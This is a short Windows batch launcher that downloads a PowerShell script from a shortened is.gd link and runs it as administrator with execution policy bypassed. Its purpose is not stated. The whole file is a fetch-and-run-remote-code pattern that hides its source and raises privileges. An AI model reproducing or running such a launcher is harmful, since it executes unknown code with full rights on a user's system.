@echo off
set "RAWURL=https://is.gd/sortps1"
powershell -NoProfile -Command ^
  "Try {
      Invoke-WebRequest -Uri '%RAWURL%' -OutFile '%~dp0sqd5.ps1' -UseBasicParsing -ErrorAction Stop;
      Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"%~dp0sqd5.ps1\"' -Verb RunAs
  } Catch {
      Write-Error 'Download failed';
      Exit 1
  }"
